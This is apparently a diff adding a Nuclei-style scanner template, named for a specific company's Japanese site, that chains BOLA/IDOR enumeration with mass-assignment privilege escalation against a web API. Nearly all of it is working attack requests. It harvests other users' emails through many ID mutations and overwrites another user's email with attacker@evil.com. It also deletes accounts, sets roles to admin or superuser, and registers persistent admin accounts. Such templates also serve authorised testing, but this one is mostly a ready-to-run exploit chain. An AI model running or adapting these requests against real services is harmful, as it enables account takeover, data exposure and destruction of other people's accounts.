@@ -1,0 +1,471 @@
+# =============================================================================
+# God‑Level BOLA → Mass Assignment Chain Template
+# Covers: Numeric, UUID, Hash, Base64, Header, Parameter, Batch, GraphQL
+# All methods: GET, POST, PUT, PATCH, DELETE
+# Includes verification and safe exploitation
+# =============================================================================
+
+id: starbucks-jp-bola-mass-god
+name: BOLA → Mass Assignment – God‑Level Chain
+severity: critical
+impact: Attacker can view, modify, or escalate privileges of any user.
+chain: BOLA (IDOR) to enumerate users, then Mass Assignment to make them admin.
+
+variables:
+  own_id: 0
+  own_email: ""
+  own_uuid: ""
+  jwt_token: ""
+
+requests:
+  # ========================================================================
+  # STAGE 0 – Authentication
+  # ========================================================================
+  - method: POST
+    path:
+      - "{{BaseURL}}/auth/login"
+      - "{{BaseURL}}/api/login"
+      - "{{BaseURL}}/rest/user/login"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "email": "YOUR_TEST_EMAIL",
+        "password": "YOUR_TEST_PASSWORD"
+      }
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+    extractors:
+      - type: json
+        name: jwt_token
+        json:
+          - "$.token"
+          - "$.access_token"
+          - "$.authentication.token"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users/me"
+      - "{{BaseURL}}/api/me"
+      - "{{BaseURL}}/profile"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+    extractors:
+      - type: json
+        name: own_id
+        json:
+          - "$.id"
+          - "$.data.id"
+          - "$.user.id"
+      - type: regex
+        name: own_email
+        regex:
+          - '"email":\s*"([^"]+)"'
+      - type: regex
+        name: own_uuid
+        regex:
+          - '"id":\s*"([a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12})"'
+
+  # ========================================================================
+  # STAGE 1 – BOLA (IDOR) – NUMERIC ID MUTATIONS
+  # ========================================================================
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users/{{ID}}"
+      - "{{BaseURL}}/api/orders/{{ID}}"
+      - "{{BaseURL}}/api/gift/cards/{{ID}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    payloads:
+      ID:
+        - "{{own_id|int + 1}}"
+        - "{{own_id|int - 1}}"
+        - "{{own_id|int * 2}}"
+        - "1,2,3,4,5,6,7,8,9,10"
+        - "100,200,300,400,500"
+        - "null"
+        - "0"
+        - "-1"
+        - "*"
+        - "all"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<html"
+          - "error"
+          - "not found"
+          - "{{own_email}}"
+      - type: regex
+        part: body
+        regex:
+          - '"email":\s*"([^"]+)"'
+          - '"id":\s*(\d+)'
+    extractors:
+      - type: regex
+        name: victim_email
+        regex:
+          - '"email":\s*"([^"]+)"'
+      - type: regex
+        name: victim_id
+        regex:
+          - '"id":\s*(\d+)'
+
+  # ========================================================================
+  # STAGE 2 – BOLA – UUID MUTATIONS
+  # ========================================================================
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users/{{UUID}}"
+      - "{{BaseURL}}/api/orders/{{UUID}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    payloads:
+      UUID:
+        - "{{own_uuid|replace_last_char(1)}}"
+        - "{{own_uuid|replace_last_char('a')}}"
+        - "00000000-0000-0000-0000-000000000000"
+        - "11111111-1111-1111-1111-111111111111"
+        - "ffffffff-ffff-ffff-ffff-ffffffffffff"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "{{own_email}}"
+          - "error"
+      - type: regex
+        part: body
+        regex:
+          - '"email":'
+
+  # ========================================================================
+  # STAGE 3 – BOLA – ENCODED IDS (Base64, MD5, SHA1)
+  # ========================================================================
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users/{{ENCODED}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    payloads:
+      ENCODED:
+        - "{{own_id|base64_encode}}"
+        - "{{own_id|md5}}"
+        - "{{own_id|sha1}}"
+        - "{{own_id|hex}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "{{own_email}}"
+
+  # ========================================================================
+  # STAGE 4 – BOLA – HEADER INJECTION (X-User-ID, Cookie, Referer)
+  # ========================================================================
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/dashboard"
+      - "{{BaseURL}}/api/profile"
+    headers:
+      X-User-ID: "{{own_id|int + 1}}"
+      X-Forwarded-User: "{{own_id|int + 2}}"
+      Cookie: "user_id={{own_id|int + 3}}"
+      Referer: "{{BaseURL}}/users/{{own_id|int + 1}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "{{own_email}}"
+      - type: regex
+        part: body
+        regex:
+          - '"email":'
+
+  # ========================================================================
+  # STAGE 5 – BOLA – PARAMETER POLLUTION (override ID)
+  # ========================================================================
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users/{{own_id}}?user_id={{own_id|int + 1}}"
+      - "{{BaseURL}}/api/users/{{own_id}}?id={{own_id|int + 2}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "{{own_email}}"
+
+  # ========================================================================
+  # STAGE 6 – BOLA – ARRAY / BATCH (multiple IDs)
+  # ========================================================================
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/users?ids[]={{own_id|int + 1}}&ids[]={{own_id|int + 2}}"
+      - "{{BaseURL}}/api/users?user_ids={{own_id|int + 1}},{{own_id|int + 2}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "{{own_email}}"
+      - type: regex
+        part: body
+        regex:
+          - '"email":'
+
+  # ========================================================================
+  # STAGE 7 – BOLA – POST / PUT / PATCH / DELETE (write operations)
+  # ========================================================================
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/users/{{ID}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+      Content-Type: application/json
+    payloads:
+      ID:
+        - "{{own_id|int + 1}}"
+        - "{{own_id|int + 2}}"
+    body: |
+      {"email": "attacker@evil.com", "name": "hacked"}
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        part: body
+        words:
+          - '"success"'
+          - '"updated"'
+
+  - method: PATCH
+    path:
+      - "{{BaseURL}}/api/users/{{ID}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+      Content-Type: application/json
+    payloads:
+      ID:
+        - "{{own_id|int + 1}}"
+    body: |
+      {"role": "superuser"}
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        part: body
+        words:
+          - '"updated"'
+          - '"patched"'
+
+  - method: DELETE
+    path:
+      - "{{BaseURL}}/api/users/{{ID}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    payloads:
+      ID:
+        - "{{own_id|int + 1}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        part: body
+        words:
+          - '"deleted"'
+
+  # ========================================================================
+  # STAGE 8 – GRAPHQL BATCH BOLA
+  # ========================================================================
+  - method: POST
+    path:
+      - "{{BaseURL}}/graphql"
+    headers:
+      Content-Type: application/json
+      Authorization: "Bearer {{jwt_token}}"
+    raw_body: |
+      [
+        {"query": "query{user(id:{{own_id|int + 1}}){email}}"},
+        {"query": "query{user(id:{{own_id|int + 2}}){email}}"},
+        {"query": "query{user(id:{{own_id|int + 3}}){email}}"}
+      ]
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: regex
+        part: body
+        regex:
+          - '"email":'
+
+  # ========================================================================
+  # STAGE 9 – MASS ASSIGNMENT – Register with admin role
+  # ========================================================================
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/Users"
+      - "{{BaseURL}}/api/register"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "email": "admin{{random}}@evil.com",
+        "password": "Admin123!",
+        "passwordRepeat": "Admin123!",
+        "role": "admin",
+        "is_admin": true,
+        "is_superuser": true,
+        "permissions": ["*"]
+      }
+    matchers:
+      - type: status
+        status: 201
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - '"id":'
+    extractors:
+      - type: json
+        name: admin_id
+        json:
+          - "$.data.id"
+          - "$.id"
+
+  # ========================================================================
+  # STAGE 10 – MASS ASSIGNMENT – Update existing user to admin
+  # ========================================================================
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/users/{{ID}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+      Content-Type: application/json
+    payloads:
+      ID:
+        - "{{own_id|int + 1}}"
+        - "{{own_id|int + 2}}"
+    body: |
+      {"role": "admin", "is_admin": true}
+    matchers:
+      - type: status
+        status: 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+
+  # ========================================================================
+  # VERIFICATION – Confirm BOLA with a different ID
+  # ========================================================================
+  - method: GET
+    path: "{{BaseURL}}/api/users/{{own_id|int + 5}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: header
+        name: Content-Type
+        value: application/json
+      - type: regex
+        part: body
+        regex:
+          - '"email":\s*"([^"]+)"'
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "{{own_email}}"
+
+  # ========================================================================
+  # VERIFICATION – Confirm Mass Assignment by fetching updated user
+  # ========================================================================
+  - method: GET
+    path: "{{BaseURL}}/api/users/{{own_id|int + 1}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+    matchers:
+      - type: status
+        status: 200
+      - type: regex
+        part: body
+        regex:
+          - '"role":\s*"admin"'
+
+  # ========================================================================
+  # EXPLOITATION – Safe proof: change victim's email (rollback after test)
+  # ========================================================================
+  - method: PUT
+    path: "{{BaseURL}}/api/users/{{own_id|int + 1}}"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+      Content-Type: application/json
+    body: |
+      {"email": "poc_{{random}}@test.com"}
+    extract:
+      type: status
+      expected: 200
+
+  # ========================================================================
+  # EXPLOITATION – Create a second admin account to prove persistence
+  # ========================================================================
+  - method: POST
+    path: "{{BaseURL}}/api/Users"
+    headers:
+      Authorization: "Bearer {{jwt_token}}"
+      Content-Type: application/json
+    body: |
+      {
+        "email": "admin2@evil.com",
+        "password": "Admin123!",
+        "role": "admin"
+      }
+    extract:
+      type: status
+      expected: 201
